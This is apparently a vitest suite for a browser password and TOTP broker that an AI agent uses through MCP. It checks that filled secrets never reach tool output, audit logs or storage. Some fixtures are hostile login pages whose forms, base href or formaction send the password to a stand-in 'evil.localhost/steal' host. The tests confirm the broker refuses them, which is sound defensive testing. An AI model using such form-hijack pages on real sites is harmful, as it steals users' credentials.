import { existsSync, readFileSync } from 'node:fs';
import { startTestRp, type TestRp, totp } from '@aab/test-rp';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { addPasswordItem } from '../src/passwords.ts';
import { dbPath, type McpHarness, startMcpHarness } from './mcp-harness.ts';

const SEED = 'JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP';
const ALICE_PW = 'alice-Secr3t/pass word+%&?';
const BOB_PW = 'bob-only-password-9f3k';

function codesAround(seed: string): string[] {
  const now = Date.now();
  const out: string[] = [];
  for (let i = -5; i <= 5; i++) out.push(totp(seed, now + i * 30_000));
  return out;
}

function forms(secret: string): string[] {
  return [
    secret,
    JSON.stringify(secret).slice(1, -1),
    encodeURIComponent(secret),
    new URLSearchParams({ v: secret }).toString().slice(2),
    Buffer.from(secret).toString('base64'),
  ];
}

function contains(haystack: string, needle: string): boolean {
  if (!/^\d+$/.test(needle)) return haystack.includes(needle);
  return new RegExp(`(?<![0-9])${needle}(?![0-9])`).test(haystack);
}

function expectNoSecrets(haystack: string, secrets: string[], where: string) {
  for (const s of secrets) {
    for (const f of forms(s)) expect(contains(haystack, f), `${f} in ${where}`).toBe(false);
  }
}

async function snapshotText(h: McpHarness): Promise<string> {
  return (await h.mcp.ok<{ snapshot: string }>('browser_snapshot')).snapshot;
}

describe('invariant 8: password and TOTP fill through MCP', () => {
  let h: McpHarness;

  beforeAll(async () => {
    h = await startMcpHarness({
      agentName: 'inv8-agent',
      rp: {
        users: [
          { username: 'alice', password: ALICE_PW, totpSecret: SEED },
          { username: 'bob', password: BOB_PW },
        ],
      },
    });
  });
  afterAll(async () => h?.close());

  const add = (site: string, username: string | null, password: string, withTotp = false) =>
    addPasswordItem(
      { signer: h.daemon.signer.client, db: h.daemon.db },
      { site, username, password, ...(withTotp ? { totp: { secret: SEED } } : {}) },
    );

  it('auth_status reports password and totp, never secrets', async () => {
    await add('rp.localhost', 'alice', ALICE_PW, true);
    await h.mcp.ok('browser_open', { url: `${h.rp.url}password/login` });
    expect(await h.mcp.ok('auth_status')).toEqual({
      origin: h.rp.origin,
      credentials: [{ type: 'password' }, { type: 'totp' }],
      humanCheck: false,
    });
  });

  it('password + TOTP sign-in: one approval, both steps filled by the broker', async () => {
    await h.intent('sign in to the test RP with my password');
    const before = h.approver.seen.length;
    const r = await h.mcp.ok('auth_login');
    expect(r).toEqual({ status: 'success' });
    expect(h.rp.logins.at(-1)).toEqual({ username: 'alice', method: 'password+totp' });
    expect(h.approver.seen.length - before).toBe(1);
    const req = h.approver.seen.at(-1);
    expect(req?.display).toStrictEqual({
      intentText: 'sign in to the test RP with my password',
      intentAt: req?.display.intentAt,
      verifiedOrigin: h.rp.origin,
      agentName: 'inv8-agent',
      credentialType: 'password+totp',
      action: 'sign-in',
    });
    expect(req?.binding.kind).toBe('fill');
    expect(await snapshotText(h)).toContain('Signed in as alice');
    const events = h.auditEvents().map((e) => e.type);
    expect(events).toContain('fill.released');
    expect(events).toContain('fill.completed');
  });

  it('a fill that starts at the one-time-code step releases only the code', async () => {
    const posted: string[] = [];
    const ctx = await h.context();
    await ctx.route(/\/inv8-otp-only$/, (r) =>
      r.fulfill({
        contentType: 'text/html',
        body: `<!doctype html><title>Code</title><form method="post" action="/inv8-otp-check">
<label>Code <input name="code" autocomplete="one-time-code"></label><button>Verify</button></form>`,
      }),
    );
    await ctx.route(/\/inv8-otp-check$/, (r) => {
      posted.push(new URLSearchParams(r.request().postData() ?? '').get('code') ?? '');
      return r.fulfill({ contentType: 'text/html', body: '<title>done</title><p>verified</p>' });
    });
    await h.mcp.ok('browser_open', { url: `${h.rp.url}inv8-otp-only` });
    expect(await h.mcp.ok('auth_login')).toEqual({ status: 'success' });
    expect(h.approver.seen.at(-1)?.display.credentialType).toBe('totp');
    expect(posted).toHaveLength(1);
    expect(codesAround(SEED)).toContain(posted[0]);
    const released = h.auditEvents().filter((e) => e.type === 'fill.released');
    expect(released.at(-1)?.payload.field).toBe('totp');
    expect(released.at(-2)?.payload.requestId).not.toBe(released.at(-1)?.payload.requestId);
  });

  it('nothing the MCP server sent, the audit log or the database holds the password, seed or a code', async () => {
    const secrets = [ALICE_PW, SEED, ...codesAround(SEED)];
    expectNoSecrets(await h.mcp.everything(), secrets, 'MCP output');
    expectNoSecrets(JSON.stringify(h.daemon.broker.audit.all()), secrets, 'audit log');
    for (const f of [dbPath(h.dataDir), `${dbPath(h.dataDir)}-wal`].filter(existsSync)) {
      expectNoSecrets(readFileSync(f).toString('latin1'), [ALICE_PW, SEED], f);
    }
  });
});

const esc = (s: string) => s.replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

const LOGIN_FORM = (action: string, method = 'post') => `<!doctype html><title>Sign in</title><body>
<form method="${method}" action="${action}">
  <label>Username <input name="username" autocomplete="username"></label>
  <label>Password <input name="password" type="password" autocomplete="current-password"></label>
  <button>Sign in</button>
</form></body>`;

const STAY_FORM = `<!doctype html><title>Sign in</title><body>
<form id="f">
  <label>Username <input id="u" autocomplete="username"></label>
  <label>Password <input id="pw" type="password"></label>
  <button>Sign in</button>
</form>
<p id="echo"></p>
<script>
document.getElementById('f').addEventListener('submit', (e) => {
  e.preventDefault();
  const v = document.getElementById('pw').value;
  document.getElementById('echo').textContent = 'You typed: ' + v;
  document.getElementById('pw').type = 'text';
  document.title = 'typed ' + v;
});
</script></body>`;

describe('invariant 8: filled secrets never come back through tool output', () => {
  let h: McpHarness;
  let site2: TestRp;
  let evil: string;

  beforeAll(async () => {
    h = await startMcpHarness({
      agentName: 'inv8-hostile',
      rp: { users: [{ username: 'alice', password: ALICE_PW }] },
      daemon: { fillStepTimeoutMs: 2_000 },
    });
    site2 = await startTestRp({
      host: 'site2.localhost',
      users: [{ username: 'bob', password: BOB_PW }],
    });
    evil = `http://evil.localhost:${new URL(h.rp.url).port}`;
    const signer = { signer: h.daemon.signer.client, db: h.daemon.db };
    await addPasswordItem(signer, { site: 'rp.localhost', username: 'alice', password: ALICE_PW });
    await addPasswordItem(signer, { site: site2.url, username: 'bob', password: BOB_PW });
    const ctx = await h.context();
    await ctx.route(/\/inv8-get-form$/, (r) =>
      r.fulfill({ contentType: 'text/html', body: LOGIN_FORM('/inv8-landing', 'get') }),
    );
    await ctx.route(/\/inv8-landing\?/, (r) => {
      const pw = new URL(r.request().url()).searchParams.get('password') ?? '';
      return r.fulfill({
        contentType: 'text/html',
        body: `<!doctype html><title>Hello ${esc(pw)}</title><body>
<p id="said">Your password is ${esc(pw)}</p>
<label>Copy <input id="copy" value="${esc(pw)}"></label>
<a href="/x?p=${encodeURIComponent(pw)}">link</a></body>`,
      });
    });
    await ctx.route(/\/inv8-stay$/, (r) =>
      r.fulfill({ contentType: 'text/html', body: STAY_FORM }),
    );
    await ctx.route(/\/inv8-cross-site$/, (r) =>
      r.fulfill({ contentType: 'text/html', body: LOGIN_FORM(`${evil}/steal`) }),
    );
    await ctx.route(/\/inv8-two$/, (r) =>
      r.fulfill({
        contentType: 'text/html',
        body:
          LOGIN_FORM('/a') + LOGIN_FORM('/b').replace('<!doctype html><title>Sign in</title>', ''),
      }),
    );
    await ctx.route(/\/inv8-iframe$/, (r) =>
      r.fulfill({
        contentType: 'text/html',
        body: '<!doctype html><title>framed</title><iframe src="/inv8-get-form"></iframe>',
      }),
    );
    const page = (head: string, body: string) =>
      `<!doctype html><head><title>Sign in</title>${head}</head><body>${body}</body>`;
    const fields =
      '<label>Username <input name="username" autocomplete="username"></label>' +
      '<label>Password <input name="password" type="password" autocomplete="current-password"></label>';
    const routes: [RegExp, string][] = [
      [
        /\/inv8-base-evil$/,
        page(
          `<base href="${evil}/">`,
          `<form method="post" action="login">${fields}<button>Go</button></form>`,
        ),
      ],
      [
        /\/inv8-form-attr$/,
        page(
          '',
          `<form id="f2" method="post" action="${evil}/steal"><button>Go</button></form>` +
            '<input name="password" type="password" form="f2">',
        ),
      ],
      [
        /\/inv8-outside-formaction$/,
        page(
          '',
          `<button form="f" formaction="${evil}/steal">Go</button>` +
            `<form id="f" method="post" action="/password/login">${fields}</form>`,
        ),
      ],
      [
        /\/inv8-two-next$/,
        page(
          '',
          '<label>Email <input id="ident" autocomplete="username"></label>' +
            '<button type="button" onclick="clicked.textContent=\'next\'">Next</button>' +
            '<button type="button" onclick="clicked.textContent=\'continue\'">Continue</button>' +
            '<p id="clicked"></p>',
        ),
      ],
      [
        /\/inv8-page-form$/,
        page(
          '',
          '<form method="post" action="/password/login">' +
            '<input id="search" type="text" name="q">' +
            '<label>Username <input id="user" type="text" name="username"></label>' +
            '<label>Password <input id="pass" type="password" name="password"></label>' +
            '<button>Sign in</button>' +
            '<label>Newsletter <input id="news" type="email" name="news"></label>' +
            '</form>',
        ),
      ],
      [
        /\/inv8-keyup$/,
        page(
          '',
          `<form method="post" action="/password/login">${fields}<button id="go" disabled>Sign in</button></form>` +
            '<script>const seen = new Set(); for (const el of document.querySelectorAll("input")) ' +
            'el.addEventListener("keyup", () => { seen.add(el.name); ' +
            'if (seen.has("username") && seen.has("password")) go.disabled = false; });</script>',
        ),
      ],
      [
        /\/inv8-base-same$/,
        page(
          '<base href="/password/">',
          `<form method="post" action="login">${fields}<button>Go</button></form>`,
        ),
      ],
    ];
    for (const [re, body] of routes) {
      await ctx.route(re, (r) => r.fulfill({ contentType: 'text/html', body }));
    }
    await ctx.route(/^http:\/\/evil\.localhost:\d+\/login$/, (r) =>
      r.fulfill({ contentType: 'text/html', body: LOGIN_FORM('/login') }),
    );
    await h.intent('sign me in to the test sites');
  });
  afterAll(async () => {
    await site2?.close();
    await h?.close();
  });

  it('identifier-first, password only: username step, then password step', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${site2.url}password/login-id` });
    expect(await m.ok('auth_status')).toEqual({
      origin: site2.origin,
      credentials: [{ type: 'password' }],
      humanCheck: false,
    });
    expect(await m.ok('auth_login')).toEqual({ status: 'success' });
    expect(site2.logins.at(-1)).toEqual({ username: 'bob', method: 'password' });
    expect(h.approver.seen.at(-1)?.display.credentialType).toBe('password');
    expect(await snapshotText(h)).toContain('Signed in as bob');
  });

  it('identifier-first where Enter does nothing: the one "Next" button is clicked, nothing else', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${site2.url}password/login-id-script` });
    expect(await m.ok('auth_login')).toEqual({ status: 'success' });
    expect(site2.logins.at(-1)).toEqual({ username: 'bob', method: 'password' });
    expect(await snapshotText(h)).toContain('Signed in as bob');
  });

  it('Enter does nothing and the submit button is ambiguous: nothing is clicked, outcome failed', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${h.rp.url}inv8-two-next` });
    expect(await m.ok('auth_login')).toEqual({ status: 'failed' });
    expect(await h.page().textContent('#clicked')).toBe('');
  });

  it('a GET form puts the password in the URL; the landing page echoes it: url, title and snapshot are scrubbed', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${h.rp.url}inv8-get-form` });
    expect(await m.ok('auth_login')).toEqual({ status: 'success' });
    const page = h.page();
    await page.waitForURL(/inv8-landing/);
    expect(new URL(page.url()).searchParams.get('password')).toBe(ALICE_PW);
    expect(await page.title()).toBe(`Hello ${ALICE_PW}`);
    expect(await page.inputValue('#copy')).toBe('');

    const snap = await m.ok<{ url: string; title: string; snapshot: string }>('browser_snapshot');
    expect(snap.snapshot).toContain('Your password is [redacted]');
    expect(snap.title).toBe('Hello [redacted]');
    expect(snap.url).toContain('password=[redacted]');
    const info = await m.ok<{ url: string }>('browser_click', {
      target: { text: 'Your password' },
    });
    expect(info.url).toContain('[redacted]');
    expectNoSecrets(await m.everything(), [ALICE_PW], 'MCP output');
  });

  it('a form that stays: outcome failed, the field is cleared, the echo and "show password" are scrubbed', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${h.rp.url}inv8-stay` });
    expect(await m.ok('auth_login')).toEqual({ status: 'failed' });
    const page = h.page();
    expect(await page.inputValue('#pw')).toBe('');
    expect(await page.getAttribute('#pw', 'type')).toBe('text');
    expect(await page.textContent('#echo')).toBe(`You typed: ${ALICE_PW}`);
    const snap = await m.ok<{ title: string; snapshot: string }>('browser_snapshot');
    expect(snap.snapshot).toContain('You typed: [redacted]');
    expect(snap.title).toBe('typed [redacted]');
    expectNoSecrets(await m.everything(), [ALICE_PW], 'MCP output');
  });

  it('other tool calls wait while a fill runs', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${h.rp.url}inv8-stay` });
    const order: string[] = [];
    const login = m.ok('auth_login').then((r) => {
      order.push('auth_login');
      return r;
    });
    await expect.poll(() => h.page().inputValue('#pw'), { timeout: 10_000 }).toBe(ALICE_PW);
    const snap = m.ok<{ snapshot: string }>('browser_snapshot').then((r) => {
      order.push('browser_snapshot');
      return r;
    });
    expect(await login).toEqual({ status: 'failed' });
    expect((await snap).snapshot).not.toContain(ALICE_PW);
    expect(order).toEqual(['auth_login', 'browser_snapshot']);
  });

  it('a wrong password: outcome failed, nothing left in the new form', async () => {
    const m = h.mcp;
    const bob = site2.users.get('bob');
    if (!bob) throw new Error('no bob');
    bob.password = 'changed-on-the-site';
    try {
      await m.ok('browser_open', { url: `${site2.url}password/login` });
      expect(await m.ok('auth_login')).toEqual({ status: 'failed' });
      expect(await h.page().inputValue('#password')).toBe('');
      expect(await snapshotText(h)).toContain('Wrong username or password');
    } finally {
      bob.password = BOB_PW;
    }
  });

  it('refuses without a prompt, and audits it: forms that submit elsewhere, two login forms, a form in an iframe', async () => {
    const m = h.mcp;
    const cases: [string, string | null][] = [
      ['inv8-cross-site', 'form_targets_other_site'],
      ['inv8-base-evil', 'form_targets_other_site'],
      ['inv8-form-attr', 'form_targets_other_site'],
      ['inv8-outside-formaction', 'form_targets_other_site'],
      ['inv8-two', 'ambiguous_form'],
      ['inv8-iframe', null],
    ];
    for (const [path, reason] of cases) {
      const before = h.approver.seen.length;
      const auditBefore = h.auditEvents().length;
      await m.ok('browser_open', { url: `${h.rp.url}${path}` });
      expect(await m.ok('auth_login'), path).toEqual({
        status: 'unsupported',
        reason: 'not_eligible',
      });
      expect(h.approver.seen.length, path).toBe(before);
      const denied = h
        .auditEvents()
        .slice(auditBefore)
        .filter((e) => e.type === 'denied');
      expect(
        denied.map((e) => e.payload.reason),
        path,
      ).toEqual(reason ? [reason] : []);
      expect(
        h
          .auditEvents()
          .slice(auditBefore)
          .some((e) => e.type === 'fill.released'),
      ).toBe(false);
    }
  });

  it('a same-site <base href> still fills and posts to the real login', async () => {
    await h.mcp.ok('browser_open', { url: `${h.rp.url}inv8-base-same` });
    expect(await h.mcp.ok('auth_login')).toEqual({ status: 'success' });
    expect(h.rp.logins.at(-1)).toEqual({ username: 'alice', method: 'password' });
  });

  it('a page-wide form with a newsletter email box: the username goes right before the password', async () => {
    await h.mcp.ok('browser_open', { url: `${h.rp.url}inv8-page-form` });
    const page = h.page();
    await page.evaluate(() => {
      for (const id of ['search', 'news']) {
        document.getElementById(id)?.addEventListener('input', () => {
          document.title = `typed into ${id}`;
        });
      }
    });
    expect(await h.mcp.ok('auth_login')).toEqual({ status: 'success' });
    expect(h.rp.logins.at(-1)).toEqual({ username: 'alice', method: 'password' });
    expect(await page.title()).not.toMatch(/typed into/);
  });

  it('a submit button enabled only by key presses: the fields are typed, the sign-in goes through', async () => {
    await h.mcp.ok('browser_open', { url: `${h.rp.url}inv8-keyup` });
    expect(await h.mcp.ok('auth_login')).toEqual({ status: 'success' });
    expect(h.rp.logins.at(-1)).toEqual({ username: 'alice', method: 'password' });
  });

  it('two fills at once both finish (no deadlock on the port lock)', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${h.rp.url}inv8-stay` });
    let n = 0;
    h.approver.decide = (() =>
      n++ === 0 ? true : new Promise((r) => setTimeout(() => r(true), 700))) as never;
    try {
      const both = Promise.all([m.ok('auth_login'), m.ok('auth_login')]);
      const hung = new Promise((_, reject) =>
        setTimeout(() => reject(new Error('fills deadlocked')), 30_000),
      );
      expect(await Promise.race([both, hung])).toEqual([
        { status: 'failed' },
        { status: 'denied' },
      ]);
      await m.ok('browser_snapshot');
    } finally {
      h.approver.decide = () => true;
    }
  });

  it('a page that leaves the origin while the user approves gets nothing', async () => {
    const m = h.mcp;
    await m.ok('browser_open', { url: `${h.rp.url}password/login` });
    const auditBefore = h.auditEvents().length;
    h.approver.decide = (async () => {
      await h.page().goto(`${evil}/login`);
      return true;
    }) as never;
    try {
      expect(await m.ok('auth_login')).toEqual({ status: 'denied' });
    } finally {
      h.approver.decide = () => true;
    }
    const after = h.auditEvents().slice(auditBefore);
    expect(after.some((e) => e.type === 'approval' && e.payload.approved === true)).toBe(true);
    expect(after.some((e) => e.type === 'fill.released')).toBe(false);
    expect(after.some((e) => e.type === 'denied')).toBe(true);
    expect(await h.page().inputValue('input[type=password]')).toBe('');
  });

  it('invariant 3: an item is never offered on another registrable domain', async () => {
    const m = h.mcp;
    const before = h.approver.seen.length;
    await m.ok('browser_open', { url: `${evil}/login` });
    expect(await m.ok('auth_status')).toEqual({ origin: evil, credentials: [], humanCheck: false });
    expect(await m.ok('auth_login', { timeoutMs: 1000 })).toEqual({
      status: 'unsupported',
      reason: 'no_credential',
    });
    expect(h.approver.seen.length).toBe(before);
  });

  it('invariant 4: no live intent → denied, no prompt, logged', async () => {
    const other = await h.addAgent('inv8-no-intent');
    const before = h.approver.seen.length;
    await other.ok('browser_open', { url: `${h.rp.url}password/login` });
    expect(await other.ok('auth_login')).toEqual({ status: 'denied' });
    expect(h.approver.seen.length).toBe(before);
    const denied = h
      .auditEvents()
      .filter((e) => e.type === 'denied' && e.payload.agentId === other.agent.id);
    expect(denied.at(-1)?.payload).toMatchObject({
      kind: 'password.fill',
      reason: 'no_live_intent',
    });
  });

  it('a denied approval fills nothing', async () => {
    const m = h.mcp;
    h.approver.decide = () => false;
    try {
      await m.ok('browser_open', { url: `${h.rp.url}password/login` });
      expect(await m.ok('auth_login')).toEqual({ status: 'denied' });
      expect(await h.page().inputValue('#password')).toBe('');
      expect(await h.page().inputValue('#username')).toBe('');
    } finally {
      h.approver.decide = () => true;
    }
  });

  it('the audit log names items and fields, never values', () => {
    const audit = JSON.stringify(h.daemon.broker.audit.all());
    expectNoSecrets(audit, [ALICE_PW, BOB_PW], 'audit');
    expect(h.daemon.broker.audit.verify()).toBeNull();
  });
});
